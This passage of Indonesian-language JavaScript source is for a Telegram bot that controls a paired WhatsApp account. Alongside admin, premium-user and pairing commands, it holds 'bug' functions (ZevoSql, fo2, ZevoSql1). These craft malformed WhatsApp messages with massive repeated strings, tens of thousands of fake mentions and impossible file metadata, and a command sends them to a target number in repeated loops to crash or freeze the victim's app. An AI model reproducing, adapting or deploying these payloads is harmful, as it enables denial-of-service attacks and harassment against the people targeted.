        inline_keyboard: [[{ text: "ᄃᴇᴋ ｲᴀʀɢᴇᴛ", url: `https://wa.me/${q}` }]],
      },
    }
  );
  
  /// Eksekusi bug setelah progres selesai
   console.log("\x1b[32m[ Proses Mengirim Bug ]\x1b[0m Tunggu Hingga Selesai");
    console.log("\x1b[32m[ Berhasil Mengirim Bug ]\x1b[0m anas Cloud");

  if (!isOwner(ctx.from.id)) {
    setGlobalCooldown();
  }

  for (let i = 0; i < 100; i++) {
    
      await NoInvis( target);
    
    console.log(chalk.red.bold(`ʀօʊֆօքօʊSending Bug ${i + 1}/100 To ${target}`));
    await new Promise(resolve => setTimeout(resolve, 1000));
  }
});
//Case bug twst


///////==== COMMAND OWNER ====\\\\\\\\\
bot.command("setjeda", checkOwner, async (ctx) => {
  const match = ctx.message.text.split(" ");
  const duration = match[1] ? match[1].trim() : null;


  if (!duration) {
    return ctx.reply(`example /setjeda 60s`);
  }

  const seconds = parseCooldownDuration(duration);

  if (seconds === null) {
    return ctx.reply(
      `/setjeda <durasi>\nContoh: /setcd 60s atau /setcd 10m\n(s=detik, m=menit)`
    );
  }

  const cooldownData = loadCooldownData();
  cooldownData.defaultCooldown = seconds;
  saveCooldownData(cooldownData);

  const displayTime =
    seconds >= 60 ? `${Math.floor(seconds / 60)} menit` : `${seconds} detik`;

  await ctx.reply(`Cooldown global diatur ke ${displayTime}`);
});
///=== comand add admin ===\\\
bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 526472198"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});
bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukin ID Nya GOBLOK !!\nContohnya Gini Nyet: /addprem 57305916"
    );
  }

  const userId = args[1];

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ heeee jadi premium 🗿 ${userId} sudah memiliki status premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ heeee jadi premium 🗿i ${userId} sudah memiliki status premium.`
  );
});
bot.command("cekidgrup", checkOwner, async (ctx) => {
  try {
    const args = ctx.message.text.split(" ");

    if (args.length < 2) {
      return ctx.reply("Masukkan link grup WhatsApp!\nContoh: /cekidgrup https://chat.whatsapp.com/ABC123XYZ456");
    }

    const groupLink = args[1].trim();
    const match = groupLink.match(/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/);

    if (!match || !match[1]) {
      return ctx.reply("Link grup tidak valid.");
    }

    const inviteCode = match[1];
    const metadata = await anas.groupGetInviteInfo(inviteCode);

    if (!metadata || !metadata.id) {
      return ctx.reply("Gagal mengambil info grup. Link tidak aktif atau bot tidak punya akses.");
    }

    const groupId = metadata.id;
    const groupName = metadata.subject || "-";
    const groupDesc = metadata.desc?.toString() || "-";
    const memberCount = metadata.size || 0;
    const creator = metadata.creator ? metadata.creator.replace("@s.whatsapp.net", "") : "-";
    const creationDate = metadata.creation ? new Date(metadata.creation * 1000).toLocaleString("id-ID") : "-";

    const adminList = metadata.participants
      ?.filter(p => p.admin)
      .map(p => `• ${p.id.replace("@s.whatsapp.net", "")} (${p.admin})`)
      .join("\n") || "-";

    const message = `
📌 Informasi Grup WhatsApp

Nama Grup       : ${groupName}
ID Grup         : ${groupId}
Tanggal Dibuat  : ${creationDate}
Dibuat Oleh     : ${creator}
Jumlah Member   : ${memberCount}

Daftar Admin:
${adminList}

Deskripsi:
${groupDesc}

Link Undangan:
https://chat.whatsapp.com/${inviteCode}
    `.trim();

    return ctx.reply(message);
  } catch (err) {
    console.error("Error /cekidgrup:", err);
    return ctx.reply("Terjadi kesalahan saat mengambil info grup.");
  }
});
///=== comand del admin ===\\\
bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789"
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Haha Mampus Lu ${userId} Di delprem etmin Annas🗿.`);
});

//fungsi imglink
const imgLinks = [];

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();



  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("addpairing", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return await ctx.reply(
      "❌ Masukin nomor nya ngentot, Contoh nih mek /addpairing <nomor_wa>"
    );
  }

  let phoneNumber = args[1].replace(/[^0-9]/g, "");

  if (anas && anas.user) {
    return await ctx.reply("Santai Masih Aman!! Gass ajaa cik...");
  }

  let sentMessage;

  try {
    // LANGKAH 1: Kirim pesan awal
    sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
ʀօʊֆօքօʊ
▢ Menyiapkan kode pairing...
╰➤ 刀のﾶの尺 : ${phoneNumber}
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "❌ Close", callback_data: "close" }]],
      },
    });

    // LANGKAH 2: Ambil kode pairing
    const code = await anas.requestPairingCode(phoneNumber, "12345678"); // CUSTOM PAIR DISINI MINIM 8 HURUF
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
ʀօʊֆօքօʊ
▢ Kode Pairing Anda...
╰➤ 刀のﾶの尺 : ${phoneNumber}
╰➤ ズのり乇  : ${formattedCode}
`,
      { parse_mode: "Markdown" }
    );

    // LANGKAH 3: Tunggu koneksi WhatsApp
    let isConnected = true;

anas.ev.on("connection.update", async (update) => {
  const { connection, lastDisconnect } = update;

  if (connection === "open" && !isConnected) {
    isConnected = true;
    await ctx.telegram.editMessageCaption(
      ctx.chat.id,
      sentMessage.message_id,
      null,
      `
ʀօʊֆօքօʊ
▢ Update pairing anda..
╰➤ 刀のﾶの尺 : ${phoneNumber}
╰➤ 丂ｲﾑｲひ丂 : Successfully
`,
      { parse_mode: "Markdown" }
    );
  }

  if (connection === "close" && !isConnected) {
    const shouldReconnect =
      lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;

    if (!shouldReconnect) {
      await ctx.telegram.editMessageCaption(
        ctx.chat.id,
        sentMessage.message_id,
        null,
        `
ʀօʊֆօքօʊ
▢ Update pairing anda...
╰➤ 刀のﾶの尺 : ${phoneNumber}
╰➤ 丂ｲﾑｲひ丂 : Gagal tersambung
`,
        { parse_mode: "Markdown" }
      );
    }
  }
});


  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("❌ Gagal melakukan pairing !");
  }
});


// Handler tombol close
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesi", checkOwner, async (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("♻️Session berhasil dihapus, Segera lakukan restart pada panel anda sebelum pairing kembali");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});

//Command Restart
bot.command("restart", checkOwner, async (ctx) => {
  await ctx.reply("Restarting...");
  setTimeout(() => {
    process.exit(0);
  }, 1000); // restart setelah 1 detik
});














async function runBrutal(type, target) {
  console.log(`[${type}] Target: ${target}`);
  for (let i = 0; i < 42; i++) {
    await ZevoSql(target);
  }
}

// Alias fungsi
async function NoInvis(target) {
  runBrutal("NoInvis", target);
}

async function DelaySlow(target) {
  runBrutal("DelaySlow", target);
}

async function DelayDuration(target) {
  runBrutal("DelayDuration", target);
}















async function ZevoSql(target) {
  try {
    // Simulasi struktur brutal ala Annas
    const simulatedPayload = {
      totoMessage: {
        text: "¿".repeat(50000),
        title: "¿".repeat(10000),
        subtitle: "¿".repeat(5000),
        footer: "¿".repeat(3000),
        shop: 3,
        id: "199872865193",
        jpegThumbnail: thumbnail
      },
      body: {
        text: "𝐊𝐞𝐩𝐅𝐨Я𝐚𝐧𝐧𝐚𝐬"
      },
      nativeFlowMessage: {
        messageParamsJson: "¿".repeat(10000)
      }
    };

    // Bangun pesan utama dalam viewOnceMessage
    const message = {
      viewOnceMessage: {
        message: {
          extendedTextMessage: {
            text: "¿".repeat(50000) + "\n\n" + JSON.stringify(simulatedPayload, null, 2),
            contextInfo: {
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 50 }, () =>
                  "1" + Math.floor(Math.random() * 99909) + "@s.whatsapp.net"
                )
              ],
              forwardingScore: 999999,
              isForwarded: true,
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
              externalAdReply: {
                title: "¿".repeat(1000),
                body: "¿".repeat(1000),
                thumbnail,
                sourceUrl: "https://t.me/annas"
              }
            }
          }
        }
      }
    };

    // Generate pesan dari konten
    const msg = await generateWAMessageFromContent(target, message, {});

    // Kirim ke target
    await anas.relayMessage(target, msg.message, {
      messageId: msg.key.id
    });

    console.log(`[SENT] Payload brutal mirip 'totoMessage' dikirim ke ${target}`);
  } catch (err) {
    console.error(`[ERROR] Gagal kirim ke ${target}:`, err);
  }
}

async function fo2(target) {


  const message = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            documentMessage: {
              url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQPuAZut76RgeDfHNNF2_Nla7ZgINJkVD8jLoN2boVBM_Lmu2ADHTXg1hRVcQSpupfUGiRWPW51vanR0TvVxE3nmEV_gwighO9d_v4SorQ?ccb=9-4&oh=01_Q5Aa1wGhivlknEqU2xUQr9adgju12aWjBsHen5jcnFKFl7yu4w&oe=68736573&_nc_sid=e6ed6c&mms3=true",
              mimetype: 'application/vnd.openxmlformats-officedocument.presentationml.presentation',
              fileLength: '1999999999',
              pageCount: 99991,
              fileName: 'annas',
              fileSha256: "W7TEBFdzHFaYDHOsYcNqw+x8anpnjwuyQguLLJu22Q0=",
              fileEncSha256: "cOxGGHNWXJF3lL/cSc6woTQHCBltD6+t4SritDk6weE=",
              mediaKeyTimestamp: "1715880173",
              mediaKey: "pOIkkv+oCyvpFQUVGnC19jiT0hWGVVy2qlHU31jUZGM=",
              directPath: "/o1/v/t24/f2/m231/AQPuAZut76RgeDfHNNF2_Nla7ZgINJkVD8jLoN2boVBM_Lmu2ADHTXg1hRVcQSpupfUGiRWPW51vanR0TvVxE3nmEV_gwighO9d_v4SorQ?ccb=9-4&oh=01_Q5Aa1wGhivlknEqU2xUQr9adgju12aWjBsHen5jcnFKFl7yu4w&oe=68736573&_nc_sid=e6ed6c",
              jpegThumbnail: thumbnail,
              scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
              scanLengths: [8596, 155493],
              height: 10000000000,
              width: 1000000000
            },
            hasMediaAttachment: true
          },
          nativeFlowMessage: {
            messageParamsJson: "{".repeat(905000)
          }
        },
        contextInfo: {
          participant: "0@s.whatsapp.net",
          fromMe: true,
          mentionedJid: [
            "0@s.whatsapp.net",
            ...Array.from({ length: 40000 }, () =>
              "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
            )
          ],
          remoteJid: "0@s.whatsapp.net",
          userJid: target
        }
      }
    }
  };

  try {
    const msg = await generateWAMessageFromContent(target, message, {});
    await anas.relayMessage(target, msg.message, {
      messageId: msg.key.id,
      userjid: target,
      participant: { jid: target }
    });
  } catch (err) {
    console.error("Gagal kirim fo2:", err);
  }
}
 







async function ZevoSql1(target) {
  try {
    
    const message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2
          },
          interactiveMessage: {
            header: {
              title: "",
              hasMediaAttachment: true,
              documentMessage: {
                url: "https://mmg.whatsapp.net/o1/v/t24/f2/m231/AQPuAZut76RgeDfHNNF2_Nla7ZgINJkVD8jLoN2boVBM_Lmu2ADHTXg1hRVcQSpupfUGiRWPW51vanR0TvVxE3nmEV_gwighO9d_v4SorQ?ccb=9-4&oh=01_Q5Aa1wGhivlknEqU2xUQr9adgju12aWjBsHen5jcnFKFl7yu4w&oe=68736573&_nc_sid=e6ed6c&mms3=true",
                mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                fileLength: "19999889",
                pageCount: 999991,
                fileName: "‽".repeat(95000),
                fileSha256: "W7TEBFdzHFaYDHOsYcNqw+x8anpnjwuyQguLLJu22Q0=",
                fileEncSha256: "cOxGGHNWXJF3lL/cSc6woTQHCBltD6+t4SritDk6weE=",
                mediaKeyTimestamp: "1715880173",
                mediaKey: "pOIkkv+oCyvpFQUVGnC19jiT0hWGVVy2qlHU31jUZGM=",
                directPath: "/o1/v/t24/f2/m231/AQPuAZut76RgeDfHNNF2_Nla7ZgINJkVD8jLoN2boVBM_Lmu2ADHTXg1hRVcQSpupfUGiRWPW51vanR0TvVxE3nmEV_gwighO9d_v4SorQ?ccb=9-4&oh=01_Q5Aa1wGhivlknEqU2xUQr9adgju12aWjBsHen5jcnFKFl7yu4w&oe=68736573&_nc_sid=e6ed6c",
                jpegThumbnail: thumbnail,
                scansSidecar: "PllhWl4qTXgHBYizl463ShueYwk=",
                scanLengths: [8596, 155493],
                height: 10000000000
              }
            },
            footer: {
              text: "‽".repeat(95000)
            },
            body: {
              text: "𝐊𝐞𝐩𝐅𝐨Я𝐚𝐧𝐧𝐚𝐬"
            },
            nativeFlowMessage: {
              messageParamsJson: "‽".repeat(1000000)
            },
            contextInfo: {
              participant: target,
              forwardingScore: 999999,
              fromMe: true,
              isForwarded: true,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from({ length: 91900 }, () =>
                  "1" + Math.floor(Math.random() * 99909) + "@s.whatsapp.net"
                )
              ],
              remoteJid: target,
              expiration: 9741,
              ephemeralSettingTimestamp: 9741,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 9742,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              },
              quotedMessage: {
                viewOnceMessage: {
                  message: {
                    interactiveResponseMessage: {
                      body: {
                        text: "Sent",
                        format: "DEFAULT"
                      },
                      nativeFlowResponseMessage: {
                        name: "galaxy_message",
                        paramsJson: "{ phynx.json }",
                        version: 3
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    };

    const msg = await generateWAMessageFromContent(target, message, {});

    await anas.relayMessage(
      target,
      msg.message,
      {
        messageId: msg.key.id,
        userjid: target,
        participant: { jid: target }
      }
    );

    console.log(`[SENT] By lokasi ${target}`);
  } catch (err) {
    console.error(`[ERROR] Gagal kirim ke ${target}:`, err);
  }
}
(async () => {

    console.clear();

    console.log("🚀 Memulai sesi WhatsApp...");

    startSesi();

    console.log("Sukses connected");

    bot.launch();

    // Membersihkan konsol sebelum menampilkan pesan sukses

    console.clear();

    console.log(chalk.bold.white(`\n

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⠿⠿⠿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣶⣿⣿⣶⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣶⣾⣿⣶⣶⣤⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠘⢿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⠀
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠈⠻⣿⣿⣿⣿⣆⠀⠀⠀⢀⠀⠀⠀⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⣀⣤⣶⣶⣌⠻⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⠁⣰⣿⣿⣿⣿⣿⣦⣙⢿⣿⣿⣿⠄⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣿⣿⣿⠀⣿⣿⣿⣿⣿⣿⣿⣿⣦⣹⣟⣫⣼⣿⣿⣶⣿⣿⣿⣿⣿⣿⣯⡉⠉⠉⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠐⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⡆⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⡇⠀⢻⣿⣿⣿⣿⣿⡇⠀⠀⠈⠉⠉⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠉⠀⠀⠀⠀⠀⠀⠀
⠀⣠⣴⣶⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⡇⠀⠸⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⢿⣿⣿⢿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀
⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣶⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣧⣄⣐⣀⣀⣀⣀⣀⡀
⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⢸⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⠀⠀⠉⠉⠙⠛⠛⠛⠛⠛⠛⠛⠛⠛⠛⠁⠛⠛⠛⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀`));

})();